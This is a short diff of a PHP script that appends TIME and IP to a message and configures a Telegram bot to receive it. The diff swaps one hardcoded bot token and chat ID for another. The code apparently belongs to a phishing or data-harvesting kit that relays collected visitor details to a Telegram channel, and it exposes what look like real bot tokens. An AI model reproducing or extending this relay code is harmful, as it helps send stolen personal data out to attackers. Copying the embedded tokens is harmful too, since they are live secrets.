@@ -20,8 +20,8 @@ $message .= "TIME: $time\n";
 $message .= "IP: $ip\n";
 
 // Telegram bot configuration
-$botToken = "2064577149:AAGwlvULbwuGJ5viekIPMxKardywDI1obDU";
-$chatID = "6417239870";
+$botToken = "7457987116:AAGXpCyNTRk7STS6Jr1-1pm74MCmtV2SRwo";
+$chatID = "-1002273241778";
 $website = "https://api.telegram.org/bot" . $botToken;
 
 // Prepare data for Telegram API request
